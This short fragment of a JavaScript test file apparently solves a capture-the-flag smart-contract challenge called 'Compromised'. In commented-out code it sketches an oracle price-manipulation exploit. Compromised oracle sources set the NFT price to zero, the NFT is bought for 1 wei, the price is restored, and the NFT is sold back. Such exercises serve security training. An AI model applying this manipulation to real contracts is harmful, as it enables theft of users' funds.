...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    //   10000000
    // );
    // await oracle.postPrice("DVNFT", 0, {
    //   from: sources[1],
    // });
    // await oracle.postPrice("DVNFT", 0, {
    //   from: sources[2],
    // });
    // await exchange.buyOne({ value: 1 });
    // await oracle.postPrice("DVNFT", INITIAL_NFT_PRICE, {
    //   from: sources[1],
    // });
    // await oracle.postPrice("DVNFT", INITIAL_NFT_PRICE, {
    //   from: sources[2],
    // });
    // await token.approve(exchange.address, 1);
    // await exchange.sellOne(1);
  });
